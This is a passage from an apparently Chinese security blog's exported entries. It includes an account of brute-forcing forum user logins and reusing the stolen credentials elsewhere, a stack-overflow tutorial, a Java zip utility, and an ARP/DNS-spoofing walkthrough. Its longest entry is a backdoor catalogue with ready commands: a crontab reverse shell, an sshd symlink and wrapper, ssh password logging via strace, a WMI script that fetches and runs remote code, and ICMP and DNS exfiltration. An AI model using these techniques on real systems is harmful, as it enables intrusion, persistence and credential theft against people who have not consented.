    <content type="text"><![CDATA[概述某次看大佬们聊天时聊到某个站，于是赶紧上去看看。 过程看看下这个站，并没找到什么能getshell的办法，好气啊。只能想想其他思路了。偶然发现可以查看其他人的个人资料以及交的会员费等详情。于是搞了个python脚本爬了下所有交了会员费的用户。 发现用户登录的地方没有验证码限制，但是有登陆错误次数限制。 可以确定这个网站用户登录的地方的登陆限制是通过IP和用户名一起的，意思是同一个ip或者同一个用户只能错误登陆5次，之后便锁定了。 IP可以用X-Forwarded-For绕过，但是用户名没办法。 既然这样的话，那就试下用户名和密码一样的吧，看看这样能不能得到一些信息。 由于之前爬下来的账户显示的是昵称，假如没有昵称就显示用户名，这里刚好可以利用这点进行BurpSuite爆破。 OK，发现还是得到了一些用户的信息，试了下，可以登录，发现还不少。 当然，登陆之后还能看到用户邮箱的一些信息，进行了一下社工，部分账号可以登录12306等网站。 后来发现这种方式可以针对大部分的dizcus进行利用。 总结技术还是有所欠缺，还是得继续学习。]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>pentest</tag>
        <tag>python</tag>
        <tag>dizcus</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 溢出]]></title>
    <url>%2F2017%2F03%2F11%2Flinux-overflow%2F</url>
    <content type="text"><![CDATA[概述Linux下的溢出学习。 目标代码12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; const char pass[] = "IloveIS2013@ZJGSU"; /* Password */ void authorized()&#123; printf( "You have been authorized!\n" );&#125; void getInput()&#123; char buffer[20]; gets( buffer ); if ( strcmp( pass, buffer ) == 0 ) &#123; authorized(); &#125; else printf("Your password is wrong!\n");&#125; int main()&#123; getInput(); return(0);&#125; 代码很简单，用户输入一个密码，然后程序把它加密起来，并且和程序中存储的密码对比，如果成功了，就调用authorized()函数，就当这个authorized()函数是用来让用户在登录后干一些敏感操作的好了。 1gcc -ggdb -fno-stack-protector -z execstack overflow.c -lcrypt -o overflow 步骤 程序分配20字节的缓冲区，然后把用户输入存储到这个缓冲区里面，然后调用函数把它加密，再和程序里的密码对比。 我们编译的时候会被编译器提示gets()不安全，事实上也是，因为它并没有做任何边界检查，所以我们就用它来调用漏洞了。 我们用objdump来dump一下生成的机器码，看看这儿它做了什么objdump -d -M intel overflow 现在我们所有要做的就是把getInput的返回地址覆盖为0x0000000000400636，而且我们可以做到。我们可 以在shell里用printf把数据传给程序，你可以用\x来转意16进制数据，因为地址是倒着来的（注：小端），所以我们也倒着给它就好了。还有，我 们需要用0x00来终止我们的缓存，这样strcmp就不会在我们函数返回之前引起一个段错误。printf的结果如下： 我们可以知道authorized()函数事实上已经执行成功了。]]></content>
      <categories>
        <category>overflow</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>overflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java Zip]]></title>
    <url>%2F2017%2F03%2F10%2Fjava-zip%2F</url>
    <content type="text"><![CDATA[概述由于最近毕业设计的需要，需要使用到Zip的解压、压缩功能，还要有能加密解密，所以去找了相关的Java zip的包，封装了下。 需要Java Zip 解压、压缩的功能，需要用到zip4j这个jar文件，当然，我使用maven直接下载的。 在pom.xml里直接添加如下代码就好了： 12345&lt;dependency&gt; &lt;groupId&gt;net.lingala.zip4j&lt;/groupId&gt; &lt;artifactId&gt;zip4j&lt;/artifactId&gt; &lt;version&gt;1.3.2&lt;/version&gt;&lt;/dependency&gt; 代码好了，直接上代码：package com.orleven.tentacle.util;import java.io.File;import java.util.ArrayList;import java.util.List;import net.lingala.zip4j.core.ZipFile;import net.lingala.zip4j.exception.ZipException;import net.lingala.zip4j.model.FileHeader;import net.lingala.zip4j.model.ZipParameters;import net.lingala.zip4j.util.Zip4jConstants;/** * Zip 处理工具包 * 需要注意的是如果压缩包里已经存在要添加的文件，会陷入死循环，所以添加之前要先判断一下。 * @author orleven * @date 2017年3月8日 */public class ZipUtil &#123; /** * 添加文件夹到zip中 * @param inPath * @param outPath * @param password * @return */ public static boolean addFoldInZip(String inPath,String storagePath,String outPath,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(outPath); ZipParameters parameters = new ZipParameters(); parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE); parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL); parameters.setRootFolderInZip(storagePath); ; if(password!=null&amp;&amp;!password.equals(""))&#123; parameters.setEncryptFiles(true); parameters.setEncryptionMethod(Zip4jConstants.ENC_METHOD_AES); parameters.setAesKeyStrength(Zip4jConstants.AES_STRENGTH_256); parameters.setPassword(password); &#125; zipFile.addFolder(inPath, parameters); return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 添加文件到zip中指定的文件夹中 * @param inPath * @param storagePath * @param outPath * @param password * @return */ public static boolean addFileInZip(String inPath,String storagePath,String outPath,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(outPath); File inFile = new File(inPath); ZipParameters parameters = new ZipParameters(); parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE); // set compression method to deflate compression parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL); parameters.setRootFolderInZip(storagePath); if(password!=null&amp;&amp;!password.equals(""))&#123; parameters.setEncryptFiles(true); parameters.setEncryptionMethod(Zip4jConstants.ENC_METHOD_AES); parameters.setAesKeyStrength(Zip4jConstants.AES_STRENGTH_256); parameters.setPassword(password); &#125; zipFile.addFile(inFile, parameters); return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 添加多个文件到zip中指定的文件夹中 * @param inPath * @param storagePath * @param outPath * @param password * @return */ public static boolean addFilesInZip(ArrayList&lt;File&gt; inFiles,String storagePath,String outPath,String password) &#123; try &#123; ArrayList filesToAdd = new ArrayList(); ZipFile zipFile = new ZipFile(outPath); ZipParameters parameters = new ZipParameters(); parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE); // set compression method to deflate compression parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL); parameters.setRootFolderInZip(storagePath); if(password!=null&amp;&amp;!password.equals(""))&#123; parameters.setEncryptFiles(true); parameters.setEncryptionMethod(Zip4jConstants.ENC_METHOD_AES); parameters.setAesKeyStrength(Zip4jConstants.AES_STRENGTH_256); parameters.setPassword(password); &#125; zipFile.addFiles(inFiles, parameters); return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 从zip中删除文件 * @param inPath * @param outPath * @param password * @return */ public static boolean removeFileInZip(String inPath,String storagePath,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(inPath); if (zipFile.isEncrypted()) &#123; zipFile.setPassword(password); &#125; List fileHeaderList = zipFile.getFileHeaders(); storagePath = storagePath.replaceAll("\\\\", "/"); for (int i =fileHeaderList.size() -1; i&gt;0 ; i--) &#123; FileHeader fileHeader = (FileHeader)fileHeaderList.get(i); if(fileHeader.getFileName().indexOf(storagePath)==0)&#123; System.out.println("Name: " + fileHeader.getFileName()); zipFile.removeFile(fileHeader.getFileName()); &#125; &#125; return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 查看压缩包的文件列表 * @param inPath * @param password * @return */ public static boolean getNameFromZip(String inPath,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(inPath); if (zipFile.isEncrypted()) &#123; zipFile.setPassword(password); &#125; List fileHeaderList = zipFile.getFileHeaders(); for (int i = 0; i &lt; fileHeaderList.size(); i++) &#123; FileHeader fileHeader = (FileHeader)fileHeaderList.get(i); System.out.println("Name: " + fileHeader.getFileName()); System.out.println("Compressed Size: " + fileHeader.getCompressedSize()); System.out.println("Uncompressed Size: " + fileHeader.getUncompressedSize()); System.out.println("CRC: " + fileHeader.getCrc32()); System.out.println("************************************************************"); &#125; return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 解压zip里的所有文件 * @param inPath * @param outPath * @param password * @return */ public static boolean extractZip(String inPath,String outPath ,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(inPath); if (zipFile.isEncrypted()) &#123; zipFile.setPassword(password); &#125; zipFile.extractAll(outPath); System.out.println(password); return true; &#125; catch (ZipException e) &#123;// e.printStackTrace(); return false; &#125; &#125; /** * 解压zip里的文件 * @param inPath * @param storagePath * @param outPath * @param password * @return */ public static boolean extractFileFromZip(String inPath,String storagePath,String outPath ,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(inPath); if (zipFile.isEncrypted()) &#123; zipFile.setPassword(password); &#125; List fileHeaderList = zipFile.getFileHeaders(); storagePath = storagePath.replaceAll("\\\\", "/"); for (int i =0;i&lt;fileHeaderList.size() ;i++) &#123; FileHeader fileHeader = (FileHeader)fileHeaderList.get(i); if(fileHeader.getFileName().indexOf(storagePath)==0)&#123; zipFile.extractFile(fileHeader, outPath); zipFile.removeFile(fileHeader.getFileName()); &#125; &#125; return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 测试zip 压缩算法 */ public static void main(String[] args) &#123; System.out.println("Zip压缩／解压缩测试"); // System.out.println("添加文件夹压缩文件"); // String inPath = "C:\\Users\\dell\\Desktop\\测试文件"; // String outPath = "C:\\Users\\dell\\Desktop\\test.zip";// String storagePath = null;// String password = "123456";// ZipUtil.addFoldInZip(inPath, storagePath,outPath,password); // System.out.println("添加文件到压缩文件"); // String inPath1 = "C:\\Users\\dell\\Desktop\\IEEE_TPDS2003.docx"; // String outPath1 = "C:\\Users\\dell\\Desktop\\test.zip";// String storagePath1 = null;// String password1 = "";// ZipUtil.addFileInZip(inPath1, storagePath1,outPath1,password1); // System.out.println("删除zip的某个文件"); // String storagePath2 = "测试文件\\毕业论文模板201435"; // String inPath2 = "C:\\Users\\dell\\Desktop\\test.zip";// String password2 = "123456";// ZipUtil.removeFileInZip(inPath2, storagePath2, password2); // System.out.println("查看zip文件中的内容"); // String inPath3 = "C:\\Users\\dell\\Desktop\\test.zip"; // String password3 = "123456";// ZipUtil.getNameFromZip(inPath3,password3); // System.out.println("解压压缩文件"); // String inPath4 = "C:\\Users\\dell\\Desktop\\www.zip"; // String outPath4 = "C:\\Users\\dell\\Desktop\\"; // String password4 = "123456";// ZipUtil.extractZip(inPath4, outPath4, password4); // System.out.println("解压zip中的某个文件"); // String inPath5 = "C:\\Users\\dell\\Desktop\\test.zip"; // String outPath5 = "C:\\Users\\dell\\Desktop\\"; // String password5 = "123456";// String storagePath5 = "测试文件\\毕业论文模板201435";// ZipUtil.extractFileFromZip(inPath5, storagePath5, outPath5, password5); System.out.println("已经输出！"); &#125;&#125;]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>zip</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中间人攻击——ARP毒化与DNS毒化]]></title>
    <url>%2F2017%2F02%2F28%2Farpspoof-dnsspoof%2F</url>
    <content type="text"><![CDATA[概述操作一波中间人攻击的ARP毒化与DNS欺骗，备忘。 准备测试机子如下 ： 攻击者：192.168.111.183被欺骗主机：192.168.111.173默认网关（_gateway）：192.168.111.2 ARP毒化查看arp表 1234root@kali:~# arpAddress HWtype HWaddress Flags Mask Iface192.168.111.254 ether 00:50:56:fe:53:af C eth0_gateway ether 00:50:56:e6:26:42 C eth0 开启转发 12345root@kali:~# cat /proc/sys/net/ipv4/ip_forward0root@kali:~# echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forwardroot@kali:~# cat /proc/sys/net/ipv4/ip_forward1 EttercapEttercap是一个多用途的开源工具，可以用来执行嗅探、密码抓取、主机分析等，并且还可以图形化启动。 另外ettercap有些不错的插件，可以增强中间人攻击。 12345dns_spoof (执行DNS欺骗攻击)Dos_attack(对受害主机进行拒绝服务攻击)Chk_poison(检测是否成功进行了攻击)Repoison_arp(顾名思义，修复ARP)...... 具体操作如下： 123root@kali:~# ettercap -G // 图形化启动ettercaproot@kali:~# ettercap -T -q -M ARP // 对所有主机进行ARP欺骗root@kali:~# ettercap -T -q -M ARP -A 192.168.111.173 // 对192.168.111.173进行欺骗 查看受害者主机的arp表会发现，网关的mac地址被替换成了攻击机的mac地址。 DsniffDsniff是一个非常强大的工具套件，它被用来进行渗透测试。它被用来实施嗅探、网络分析等。它能够捕捉各种协议。ARPspoof和driftnet也是dsniff套件的一部分，当然还有其他套件，如： 12345MsgsnarfUrlsnarfMailsnarfFilesnarfdnsspoof arpspoof重定向受害者的流量传送给攻击者。1234root@kali:~# arpspoof -i eth0 -t 192.168.111.173 192.168.111.20:c:29:eb:ff:b9 0:c:29:d0:84:fc 0806 42: arp reply 192.168.111.2 is-at 0:c:29:eb:ff:b90:c:29:eb:ff:b9 0:c:29:d0:84:fc 0806 42: arp reply 192.168.111.2 is-at 0:c:29:eb:ff:b9...... arpspoof网关的数据重定向到攻击者的机器。（流量由网关到攻击者再到受攻击者）1234root@kali:~# arpspoof -i eth0 -t 192.168.111.2 192.168.111.1830:c:29:eb:ff:b9 0:50:56:e6:26:42 0806 42: arp reply 192.168.111.183 is-at 0:c:29:eb:ff:b90:c:29:eb:ff:b9 0:50:56:e6:26:42 0806 42: arp reply 192.168.111.183 is-at 0:c:29:eb:ff:b9...... 截获敏感信息12root@kali:~# driftnet -i eth0 // 截获图片root@kali:~# dsniff -i eth0 // 截获密码 DNS毒化DNS欺骗攻击是一种非常危险的中间人攻击，它容易被攻击者利用并且窃取用户的机密信息。使用DNS欺骗中间人攻击，攻击者将截取会话，然后转移到一个假网站的会话。假如：用户希望访问baidu.com，并且谷歌的IP地址为220.181.57.216，攻击者就可以使用DNS欺骗技术拦截会话，并将用户重定向到假冒的网站，假网站IP可以为任意IP。 Ettercapettercap包含一个DNS插件，可以进行DNS欺骗攻击。 在服务器上开启web服务。 查找编辑etter.dns文件，并在里面添加需要进行欺骗网站域名： 123root@kali:~# find / -name etter.dns/etc/ettercap/etter.dnsroot@kali:~# vim /etc/ettercap/etter.dns 比如将google.com的ip导向118.24.150.108 123google.com A 118.24.150.108 *.google.com A 118.24.150.108 www.google.com PTR 118.24.150.108 然后启动 1root@kali:~# ettercap -G 点击上方菜单的Sniff，选择Unified sniffing，并选择网卡。 点击上方菜单的Hosts，选择Scan for hosts，进行主机扫描。 点击上方菜单的Hosts，选择Hosts list，进行选择目标主机为target1，选择网关为target2。 点击上方菜单的Mitm，选择ARP Poisoning，然后勾选Sniff remote connections。 点击上方菜单的Plugins，选择Manage the plugins，然后勾选dns_spoof以及remote browser,当然还有其他插件，根据需求选择。 目标主机访问此域名google。 参考资料中间人攻击-ARP毒化中间人攻击-DNS毒化]]></content>
      <categories>
        <category>spoof</category>
      </categories>
      <tags>
        <tag>arpspoof</tag>
        <tag>dnsspoof</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Backdoor 基础]]></title>
    <url>%2F2017%2F01%2F21%2Fbackdoor-base%2F</url>
    <content type="text"><![CDATA[概述 没有最好的后门，只有最合适的后门。 在整体架构上，一个优秀的后门应该充分考虑其功能、触发方式和通信方式等方面。针对不同的方面，杀软也会根据其特征进行处理。为了进一步的持续性控制以及后渗透，后门越显复杂化。从后门的发展史中可看出，这是一场攻与防的持续性较量，简单来说，渗透测试拿下服务器后，怎么能不留后门呢。当然，这是玩笑话。 分类 终端平台：Linux型、Windows型和IOT型； Linux：配置型、logger型和rookit型； Windows：Registry型、Schtasks型和WMI型； 通信方式：http/https型、irc型、dns型、icmp型等。 网站应用：模块扩展型、后端语言型和配置文件型。 终端平台Linux配置型这里的配置型是指借助Linux系统本身的一些特性来完成后门布置功能。 crontab运维经常会用到该命令，这相当于windows的计划任务，规定时间来执行指定命令。这通常与反弹shell一起运用。 1$ (crontab -l;printf "*/5 * * * * exec9&lt;&gt; /dev/tcp/localhost/8080&amp;&amp;exec0&lt;&amp;9&amp;&amp;exec1&gt;&amp;92&gt;&amp;1&amp;&amp;/bin/bash --noprofile –I;\rno crontab for `whoami`%100c\n")|crontab - ssh公钥免密将客户端生成的ssh公钥写到所控服务器的~/.ssh/authorized_keys中，然后客户端利用私钥完成认证即可登录。 123$ ssh-keygen -t rsa$ lsid_rsa id_rsa.pub 把id_rsa.pub写入服务端的authorized_keys中，并修改好相应权限。 12$ chmod 600 ~/.ssh/authorized_keys$ chmod 700 ~/.ssh 这种后门的特点是简单易用，但在实战中会被服务器的配置环境所限制，以及容易被发现。 软连接后门1$ ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555; 经典后门。直接对sshd建立软连接，之后用任意密码登录即可。 1ssh root@x.x.x.x -p 5555 但这隐蔽性很弱，一般的rookit hunter这类的防护脚本可扫描到。 SSH Server wrapper123456789101112$ cd /usr/sbin/$ mv sshd ../bin$ vim sshd#!/usr/bin/perlexec"/bin/sh"if(getpeername(STDIN)=~/^..LF/);exec&#123;"/usr/bin/sshd"&#125;"/usr/sbin/sshd",@ARGV;``` 赋予权限chmod 755 sshd，最后正向连接：``` bashsocat STDIO TCP4:target_ip:22,sourceport=19526 其中，\x00\x00LF是19526的大端形式，便于传输和处理。原理是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。隐蔽性比刚刚介绍的软连接后门要好。 logger型alias这种通过替换命令来使得evil效果最大化的用法，一般是通过追踪ssh的系统调用比如read、write等来记录下ssh的操作。 1alias ssh=&apos;strace -o /tmp/sshpwd-`date &apos;+%d%h%m%s&apos;`.log -e read,write,connect -s2048 ssh&apos; 当然，这只是alias后门的一种用法，可根据具体情况举一反三。 pampam是一种认证机制，它可帮助管理员快速方便地配置认证方式，并且无需更改服务程序。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的帐号密码。搭建方式见下连接。 openssh后门同理，也是下载对应的恶意补丁包，来记录管理员的帐号密码。但该后门与pam后门存在很大的问题是编译环境，有时在实战中会出现各种各样的问题。搭建方式见下连接。 rookit应用级rootkit应用级rookit的主要特点是通过批量替换系统命令来实现隐藏，如替换ls、ps和netstat等命令来隐藏文件、进程和网络连接等，有时会有守护进程来保证后门的稳定性。推荐两款常用的木马：mafix和brookit。如果想要学习linux类木马，推荐阅读orange的tsh源码，基本上涵盖了常规木马应具有的特点。 内核级rookit隐藏性通常要借助对linux系统调用的截获来达到目的，并且难以查杀，难以清除，危害巨大。由于未找到相应例子，遂不做具体分析。 windowswindows后门博大精深，实在不好分类，因为后门常需持久化潜在运行，受到powersploit中persistence脚本的启发，因此采取使用后门的触发方式进行分类，分为registry型、schtasks型和WMI型。 registry型在一般用户权限下，通常是将要执行的后门程序或脚本路径填写到如下注册表的键值中HKCU:Software\Microsoft\Windows\CurrentVersion\Run，键名任意。普通权限即可运行。 不过这老生长谈的后门早已被用烂，360杀软会弹框提示。 schtasks型该类型后门可分为管理员权限和普通用户权限，管理员权限可以设置更多的计划任务，比如重启后运行等。 1schtasks /Create /SC HOURLY /TN Updater /TR $CommandLine 这里比较大的限制是策略问题，只能按照规定的时间来执行相关程序或命令。通常来讲，持久性的APT对于这点要求较高。 WMI型Defcon23的演讲后，WMI型后门的热度在国外迅速蔓延。（强烈推荐使用该类型后门）它是只能由管理员权限运行的后门，一般是用powershell编写。目前以这一触发方式运行的后门是不会引起杀软任何反映的。具体原理可到drops去了解。 该类型后门主要用到了WMI展现出来的两个特征：无文件和无进程。 将core code加密存储于WMI类的property中，而该位置在复杂的CIM 数据库中，这达到了所谓的无文件；将filter和consumer异步绑定在一起，当规定的filter满足条件时，比如间隔1min，那么系统会自动启动一进程（名称为powershell）去执行consumer（后门程序）中的内容，当执行完成后，进程会消失，持续的时间根据后门运行情况而定，一般是几秒，这达到了所谓的无进程。 上述三类的详情代码请参考powersploit现阶段无论再复杂的WMI后门都是围绕上面两点而展开的，最核心的是后者。 下面是比较典型的代码，功能为每分钟执行下载并执行： 1234567891011121314151617181920212223242526272829$Name = &apos;test&apos;# build the filter$TimeExecTime = 60$Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN$TimeExecTime WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot;$NS = &quot;root\subscription&quot;$FilterArgs = @&#123; Name=$Name EventNameSpace=&quot;root\cimv2&quot; QueryLanguage=&quot;WQL&quot; Query=$Query&#125;$Filter = Set-WmiInstance -Namespace $NS -Class &quot;__EventFilter&quot; -Arguments $FilterArgs# build the consumer$ConsumerName = $Name$command = &quot;`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add(&apos;User-Agent&apos;,&apos;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko&apos;); `$wc.proxy = [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.DownloadString(&apos;$URL&apos;))&quot;#$encCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))$commandLine = &quot;C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -NoP -NonI -w hidden -Command $command&quot; $ConsumerArgs = @&#123; Name=$ConsumerName CommandLineTemplate=$commandLine&#125;$consumer = Set-WmiInstance -Class &quot;CommandLineEventConsumer&quot; -Namespace $NS -Arguments $ConsumerArgs#Bind filter and consumer$Args = @&#123; Filter = $Filter Consumer = $consumer&#125;Set-WmiInstance -Class &quot;__FilterToConsumerBinding&quot; -Namespace &quot;root\subscription&quot; -Arguments $Args IOT物联网的脆弱性因Mirai恶意软件的肆用而不断凸显，特别是弱口令的泛滥、致使了大批物联网设备沦陷。其中造成的危害不言而喻，不但可以耗用其资源，更可怕的是可能利用设备本身的功能造成意料不到的伤害。如果单单从技术的角度上讲，Mirai确实是一款非常优秀的恶意软件。在这里，我们只讨论它们的后门特性： 进程对于运行时进程的处理，Mirai采用的是进程名随机，也算是为了不被特征提取所采取的一个措施。 http://p9.qhimg.com/t0147848fcfcfd59340.png 防重启因为IOT设备的特殊性，无法将程序写进设备中，只能驻留在内存里，所以需不能使设备重启。在固件里，有一进程会不断向watchdog进程发送一字节数据，如果没有该操作，设备则会重启。Mirai采取的是关闭watchdog的功能。 http://p4.qhimg.com/t01e96433fc3208ba2b.png 通信协议该过程可以分为上线过程：bot发送\x00\x00\x00\x01，得到回应后再发送\x00；心跳过程：bot间隔60s发送\x00\x00cnc，cnc回应\x00\x00；解析执行：cnc对bot发出的指令里采取了一定的格式。[target_num] 02 [IP] 08 08 08 08 [MASK] 20 [IP] 07 07 07 07 [MASK] 20….. IOT设备后门的重点往往是在其功能的实现上，而不是在后门的persistence上，因为IOT设备一旦被突破，几乎入无人之境，恶意软件会合理地最大化利用其中的资源。 通信方式类后门的网络通信行为同样是防火墙的侦查重点，在复杂的实际环境下，怎么把被控端的数据回传成为了一个难点。对于不同的防火墙，其使用的策略也有些不同。 http/https型目前可以说这是最流行的通信方式，可借用第三方的api来实现回连功能，从很大程度上讲解决了很多困难。像在github star比较高的，如twittor、gcat等，从代码上看不会有太大问题，主要是完成了对相应第三方应用的api调用以及功能的实现，但是这种第三方选取并不合理，它会造成溯源十分容易。先不论gmail的实名制，问题的关键在于被控端只能共享一个或几个gmail帐号，当其中一个被控端被追查后，其它的被控端很可能就处于危险状态。 根据经验来看，如果真要借助第三方的网站来完成通信，比较常用的是论坛、网盘等，可以将被控端各自的权限分离开来。在很多APT报告中，我们可看到dropbox及reddit快成为远控木马的重灾区，官方当然也出台了一些措施来制止这种行为。 这部分木马可参考nishang框架中的HTTP-Backdoor脚本。 总的来讲，这种适合于比较小型的，不适合于大型僵尸网络。在国内这种类型的网站基本需要实名制，以官方的力量来追踪是十分容易的。危害小则被封号，大则查水表。 目前对于追踪的问题主流采取的是DGA(Domain Generation Algorithm)，自建服务器。 攻击者和被控段以同样的算法和种子算出一系列域名，种子的约定可以是日期，可以是天气等。攻击者注册其中的一个或多个域名。这样的好处是反汇编难度大，算法不易被破解。即使被破解了，安全人员还需抢在攻击者之前及时注册生成的大量域名，费时费钱费力。 更多详细的可参考《C&amp;C控制服务的设计和侦测方法综述》 irc型irc的木马优点很多，比如管理方便，便于远控协调分工，channel隐藏，追溯难。缺点很明显，国内只有较少的用户使用irc，用户防火墙可能会拦截该流量，具体情况根据地区而定。关于这部分irc木马的中文实例资料可参考 icmp型ICMP通信协议中可看到在最后空余了很大的data段，名为数据缓冲区，可填充60000多字节。因此，可将被控端得到的数据放入其中： 1234$cmd = ls;$timeout = 1000;$server_ip = 'xxxx';(New-Object System.Net.NetworkInformation.Ping).Send($server_ip, $timeout, $cmd) 在server_ip上抓包可看到返回结果。 dns型DNS原理在这不过多展开，这种类型的逃逸方法一般是用自己申请的域名，将NS记录指向搭建的NS服务器上，使用DNS泛解析，把用户所查询关于该域名的信息记录下来。 1$ ping -c 2 `whoami`.xxxx.ceye.io 1$ nslookup -querytype=txt $data.ns.lynahex.com 8.8.8.8 不过使用如上的常规方法，似乎会对data长度有限制。自建NS服务器的源码可看NoEye（题外话：有的厂商从数据库中查询指定域名的txt记录时并未过滤，可能会有sql注入。:-D。） 该类流行的木马可参考dnscat2,它涉及了更底层的包构造，即使没有域名，也可使用该协议进行通信。 具体用法 总的来说，这类后门依赖于上层协议，符合人们常用协议的范围，同时，攻击者也在探寻新兴的协议来exfiltrate。 网站类传统的后门中自然少不了该类型，从用户发出数据请求开始到最终落入网站的数据库中，经过服务端的每一环节都有可能成为攻击者利用的地方。 模块扩展型中间件之所以能被利用，是因为它们的可扩展性，当布置完模块或插件时，中间件无法判断开发者的行为是否为恶意。 apache将后门增加到apache模块目录中，攻击者只需要简单地发起一个请求就可拿到root权限的shell，并且没有任何日志记录。最出名的莫过于mod_rootme 具体操作可参考 ginxnginx占有内存少，并发能力强，受到很多用户的喜爱。它可很方便地添加和升级模块，同理，pwnginx作为经典的后门也是应用了该原理，程序员只需将正常的功能稍微改动，就能达到另一面的效果。 iisiis后门是用了iis本身的机制，当在http头里增加一字段即可触发后门，并执行发过来的命令。具体原理和操作可参考中间件的后门大多是以类似上述原理为基础的。 PHP扩展库同理，将编译好的so文件添加到php.ini的extension中。当模块被初始化时，会去加载执行我们的代码。当发送特定参数的字符串过去时，即可触发后门。 后端语言型这类后门在新型框架和语言的兴起下，影响力有些稍稍减弱。主要原因是现主流框架都采取路由的方式来映射url，有时攻击者即使上传完后门，也有可能无法找到对应的路由映射方式。站在不同人群的角度来看后门也别有一番风情。下面分为开发者后门和攻击者使用的后门，其中针对攻击者的后门是以PHP为例。 开发者后门有时开发者也会在代码中留下后门，比如x博CMS。它通常是一些奇怪的代码，稍微动态调试下可分析出后门，这是属于比较低级的，更高级的的后门是逻辑和理论相关的漏洞，在defcon23上进行的“卑鄙密码竞赛”，曾经wooyun有介绍，有的参赛者将密码学的知识和PHP特性相结合，并以一定的逻辑性代码迷惑大多数人。虽然不难，但能想出这点子实在难能可贵。更为有趣的是，即使被发现了也可当作是个漏洞处理，舆论不会偏向于说这是开发者留下的后门。 另外一方面，后门不一定直接出现在产品中，可能也会存在库中或编译好的文件里，比如nodesjs仓库或pyc后门。 PHP后门随着时代的变迁，木马的重心也随着转移。前10年里，PHP马看重的是功能，而如今则是免杀以及绕waf的能力，具体来说，指的是木马静态文件的免杀和通信流量的无特征。 在实战中，主要采取的方法为混淆编码、字符替换等，还可利用解释性语言的特性以及其回调机制。对于通信流量方面，一般采取对称加密，如DES，而不是编码等。比较成熟的后门是weevely，也可根据需求将菜刀完善，把流量加密。 配置文件型该类型后门主要是通过阅读相关官方文档来挖掘发现，主要应用场景是bypass上传文件的黑名单。以PHP语言为例： .htaccess后门在.htaccess中添加php解析的新后缀并上传，之后上传该后缀的木马即可。 1AddType application/x-httpd-php .abc .user.ini后门.user.ini相当于用户自定义的php.ini。 上传.user.ini，其中的内容为： 1auto_prepend_file=xx.gif 可以让该目录下的所有php文件自动包含xx.gif，我们直接上传xx.gif作为木马。不过较大的限制是该目录下必须要有正常的php文件才能使得xx.gif中的代码执行。 总结当然，上面的这些都是大牛们总结的，我只是个搬运工。]]></content>
      <categories>
        <category>backdoor</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>backdoor</tag>
        <tag>linux</tag>
        <tag>iot</tag>
        <tag>protocol</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 基础知识]]></title>
    <url>%2F2016%2F12%2F22%2Flinux-base%2F</url>
    <content type="text"><![CDATA[概述记录一下Linux的常用命令，方便查询。 持续更新中。 目录基本目录12345678910111213141516171819202122232425262728/var (variable)：与系统运作过程有关。/var/log/ 日志/dev 驱动 比要重要的档案有/dev/null, /dev/zero, /dev/tty, /dev/lp*, /dev/hd*, /dev/sd*等等/usr (软件放置处)/usr/local 系统管理员在本机自行安装自己下载的软件/usr/share/doc 说明文件档/opt (第三方协力软件)/etc (配置文件) /etc/init.d/：所有朋务的预设启动 script 都是放在这里的。 例如要启动或者关闭 iptables 的话：『 /etc/init.d/iptables start』、『/etc/init.d/iptables stop』/boot (开机与核心档) Linux kernel常用的档名为：vmlinuz，如果使用的是grub这个开机管理程序， 则还会存在/boot/grub/这个目录喔！/bin 系统有很多放置执行文件的目录，但/bin比较特殊。 因为/bin放置的是在单人维护模式下还能够被操作的指令。在/bin底下的指令可以被root不一般账号所使用，主要有：cat, chmod, chown, date, mv, mkdir, cp, bash等等常用的指令。/home 这是系统默认的用户家目录(home directory)。/lib 系统的函式库/media 可移除的装置啦！ 包括软盘、光盘、DVD等等装置都暂时挂载在这。/mnt 如果你想要暂时挂载某些额外的装置，一般建议你可以放置到这个目录中。/srv 是一些网络朋务启动后，这些服务所需要取用的数据目录。/tmp 暂时放置档案的地方。/lost+found 